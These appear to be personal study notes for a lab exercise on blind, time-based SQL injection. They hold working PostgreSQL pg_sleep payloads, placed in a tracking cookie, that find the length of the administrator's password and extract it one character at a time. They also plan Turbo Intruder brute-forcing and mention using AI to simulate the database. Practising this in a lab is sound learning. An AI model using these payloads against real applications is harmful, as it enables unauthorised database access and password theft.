# Scenario

1. Application uses a tracking cookie and performs a SQL query containing the value of the submitted cookie.
2. Results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error.

# Payload

`id=''||(case when('b'='a')then pg_sleep(5)else null end)--`
1. Find way to bruteforce every single character of password of administrator
2. Or there are other way?
3. Available tool to use is turbo_intruder extension in burpsuite

`'||(case when(length((select password from users where username='administrator'))=20) then pg_sleep(5)else null end)--`
1. use AI to simulate the database, try to interact with it by payload to test if it working correctly

`'||(case when(substring((select password from users where username='administrator') ,3,1)='l') then pg_sleep(20)else null end)--`

# turbo_intruder

1. the payload is inserted in %s in the request

